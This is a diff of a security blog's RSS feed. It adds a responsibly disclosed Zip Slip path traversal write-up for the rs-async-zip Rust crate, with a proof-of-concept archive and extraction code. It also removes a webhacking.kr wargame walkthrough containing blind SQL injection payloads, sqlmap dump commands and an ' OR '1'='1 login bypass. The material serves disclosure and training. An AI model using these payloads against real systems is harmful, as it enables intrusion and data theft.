@@ -6,9 +6,76 @@
 </description>
     <link>http://snoopysecurity.github.io/</link>
     <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 19 Mar 2022 22:29:37 +0000</pubDate>
-    <lastBuildDate>Sat, 19 Mar 2022 22:29:37 +0000</lastBuildDate>
+    <pubDate>Sun, 27 Mar 2022 22:09:00 +0100</pubDate>
+    <lastBuildDate>Sun, 27 Mar 2022 22:09:00 +0100</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
+    
+      <item>
+        <title>rs-async-zip Zip Path Traversal (Zip Slip)</title>
+        <description>&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/Majored/rs-async-zip&quot;&gt;rs-async-zip&lt;/a&gt; is a asynchronous ZIP archive reading/writing crate with a heavy focus on streaming support. This package is vulnerable to Zip Traversal (Zip Slip).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This issue was privately disclosed to the maintainer. He has stated that he has made conscious decision not to mitigate any sort of traversal attacks within the library itself. He has however added a notice to to the example code https://github.com/Majored/rs-async-zip/commit/08587b8933f80f8a70b4e313313f2fffc22c983a. This was also further discussed here &lt;a href=&quot;https://github.com/rustsec/advisory-db/pull/1141&quot;&gt;https://github.com/rustsec/advisory-db/pull/1141&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;ZIP Traversal Attacks is a form of a Directory Traversal that can be exploited by extracting files from an archive. More about this type of vulnerability can be read about here: &lt;a href=&quot;https://snyk.io/research/zip-slip-vulnerability&quot;&gt;https://snyk.io/research/zip-slip-vulnerability&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pocsteps-to-reproduce&quot;&gt;PoC/Steps to Reproduce&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;1) Download the Zip file which contains a file called ../../../../../../../tmp/test.txt (Download link:  https://github.com/snoopysecurity/Public/blob/master/payloads/shell.zip)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;2) Run the below code and provide the path to shell.zip&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use std::path::Path;
+use std::sync::Arc;
+
+use async_zip::read::fs::ZipFileReader;
+use tokio::fs::File;
+
+#[tokio::main]
+
+async fn main() {
+
+    let zip = Arc::new(ZipFileReader::new(&quot;/home/snoopy/shell.zip&quot;).await.unwrap());
+
+    println!(&quot;Extracting Archive&quot;);
+    let mut handles = Vec::with_capacity(zip.entries().len());
+    for (index, entry) in zip.entries().iter().enumerate() {
+        if entry.dir() {
+            continue;
+        }
+        let local_zip = zip.clone();
+        handles.push(tokio::spawn(async move {
+            let reader = local_zip.entry_reader(index).await.unwrap();
+            let path_str = format!(&quot;./output/{}&quot;, reader.entry().name());
+            let path = Path::new(&amp;amp;path_str);
+            tokio::fs::create_dir_all(path.parent().unwrap()).await.unwrap();
+            let mut output = File::create(path).await.unwrap();
+            reader.copy_to_end_crc(&amp;amp;mut output, 65536).await.unwrap();
+        }));
+
+    }
+    
+    for handle in handles {
+        handle.await.unwrap();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sun, 27 Mar 2022 10:00:00 +0100</pubDate>
+        <link>http://snoopysecurity.github.io/software-security/2022/03/27/rs-async-zipslip.html</link>
+        <guid isPermaLink="true">http://snoopysecurity.github.io/software-security/2022/03/27/rs-async-zipslip.html</guid>
+        
+        
+        <category>software-security</category>
+        
+      </item>
     
       <item>
         <title>Joern Cheat Sheet</title>
@@ -3176,174 +3243,6 @@ Transfer-Encoding: chunk
         
         
         <category>web-application-security</category>
-        
-      </item>
-    
-      <item>
-        <title>Webhacking.kr Solutions</title>
-        <description>&lt;p&gt;This blog post contains a walk-through of &lt;a href=&quot;https://webhacking.kr/&quot;&gt;https://webhacking.kr/&lt;/a&gt; wargames which was recommended to me by a friend.&lt;/p&gt;
-
-&lt;h3 id=&quot;level-1&quot;&gt;Level 1&lt;/h3&gt;
-
-&lt;p&gt;The following can be seen in level 1.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The source code of the backend application can be read by clicking the view source button.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/1-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A cookie called &lt;code class=&quot;highlighter-rouge&quot;&gt;user_lv&lt;/code&gt; is being set every time the user visits the page which has a numeric value. If this value is more that 6, then the backend application will set it to 1. If this value is more than 5, then the &lt;code class=&quot;highlighter-rouge&quot;&gt;solve&lt;/code&gt; function can be triggered.&lt;/p&gt;
-
-&lt;p&gt;This function can be triggered by sending a value such as &lt;code class=&quot;highlighter-rouge&quot;&gt;5.5&lt;/code&gt; which is smaller than &lt;code class=&quot;highlighter-rouge&quot;&gt;6&lt;/code&gt; and is higher than &lt;code class=&quot;highlighter-rouge&quot;&gt;5&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /challenge/web-01/ HTTP/1.1
-Host: webhacking.kr
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-GB,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://webhacking.kr/old.php
-Connection: close
-Cookie: user_lv=5.5; PHPSESSID=qksuhplclrtd25armt59rkatn6
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;level-2&quot;&gt;Level 2&lt;/h3&gt;
-
-&lt;p&gt;The following can be seen in the HTML markup of the level 2 page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking at the response, a cookie named &lt;code class=&quot;highlighter-rouge&quot;&gt;time&lt;/code&gt; is being set which reflects the date and time value show in the above HTML comment.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The presence of SQL Injection can be discovered by trying a query such as &lt;code class=&quot;highlighter-rouge&quot;&gt;1604695706 AND 1=1&lt;/code&gt; which returns true returns the following data: &lt;code class=&quot;highlighter-rouge&quot;&gt;2070-01-01 09:00:01&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;1604695706 AND 1=2&lt;/code&gt; which returns &lt;code class=&quot;highlighter-rouge&quot;&gt;2070-01-01 09:00:00&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Since the vulnerability is a blind based SQL injection, time-based blind techniques can be used to iterate through characters and compare them with the index of the current database name using an IF statement, and if this statement is true, then the MySQL &lt;code class=&quot;highlighter-rouge&quot;&gt;sleep&lt;/code&gt; function is triggered for 5 seconds. An example of this can be seen below.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1604695706 AND 7678=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&amp;gt;48),SLEEP(5),7678)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The same technique can be used to iterate through and extract more data.&lt;/p&gt;
-
-&lt;p&gt;SQLMap can be used to automate this process.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;To get the current database the application is running under, the ` –current-db` option can be used which reveals the current database to be ‘chall2’.&lt;/p&gt;
-
-&lt;p&gt;SQLMap can then be used to get the tables belonging to this database.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6' -D chall2 --table
-
-Database: chall2
-[2 tables]
-+---------------+
-| admin_area_pw |
-| log           |
-+---------------+
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;--dump&lt;/code&gt; option can be used to extract the password.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This can be used to complete challenge 2.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/2-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;level-3&quot;&gt;Level 3&lt;/h3&gt;
-
-&lt;p&gt;Level 3 presents a Nonogram/Sudoku puzzle. This can be read as follows: Horizontally, the last line has 5 black colors, second to last 2 colors etc etc. An example of this can be seen below:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After multiple tries, this was found to be the correct answer.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;You are then presented with the following form.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A hidden parameter exists which is vulnerable to SQL injection, this can be exploited as follows.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /challenge/web-03/index.php HTTP/1.1
-Host: webhacking.kr
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-GB,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 38
-Origin: https://webhacking.kr
-Connection: close
-Referer: https://webhacking.kr/challenge/web-03/index.php?_1=1&amp;amp;_2=0&amp;amp;_3=1&amp;amp;_4=0&amp;amp;_5=1&amp;amp;_6=0&amp;amp;_7=0&amp;amp;_8=0&amp;amp;_9=0&amp;amp;_10=0&amp;amp;_11=0&amp;amp;_12=1&amp;amp;_13=1&amp;amp;_14=1&amp;amp;_15=0&amp;amp;_16=0&amp;amp;_17=1&amp;amp;_18=0&amp;amp;_19=1&amp;amp;_20=0&amp;amp;_21=1&amp;amp;_22=1&amp;amp;_23=1&amp;amp;_24=1&amp;amp;_25=1&amp;amp;_answer=1010100000011100101011111
-Cookie: PHPSESSID=qksuhplclrtd25armt59rkatn6
-Upgrade-Insecure-Requests: 1
-
-answer='+OR+'1'='1&amp;amp;id=SS
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/webhackingkr/3-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;level-4&quot;&gt;Level 4&lt;/h3&gt;
-
-&lt;p&gt;The following code is presented for Level 4.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
-  include &quot;../../config.php&quot;;
-  if($_GET['view-source'] == 1) view_source();
-?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Challenge 4&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;9pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
-  sleep(1); // anti brute force
-  if((isset($_SESSION['chall4'])) &amp;amp;&amp;amp; ($_POST['key'] == $_SESSION['chall4'])) solve(4);
-  $hash = rand(10000000,99999999).&quot;salt_for_you&quot;;
-  $_SESSION['chall4'] = $hash;
-  for($i=0;$i&amp;lt;500;$i++) $hash = sha1($hash);
-?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;center&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cellpadding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;colspan=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;background:silver;color:green;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=$hash?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;center&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?view-source=1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;[view-source]&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The above PHP code takes a number between 10000000 and 99999999 and merges it with &lt;code class=&quot;highlighter-rouge&quot;&gt;salt_for_you&lt;/code&gt;. This value is then encrypted 500 times with the &lt;code class=&quot;highlighter-rouge&quot;&gt;sha1&lt;/code&gt; hashing algorithm.&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 03 Apr 2020 10:00:00 +0100</pubDate>
-        <link>http://snoopysecurity.github.io/capture-the-flag/2020/04/03/04_webhacking_kr_solutions.html</link>
-        <guid isPermaLink="true">http://snoopysecurity.github.io/capture-the-flag/2020/04/03/04_webhacking_kr_solutions.html</guid>
-        
-        
-        <category>capture-the-flag</category>
         
       </item>
     
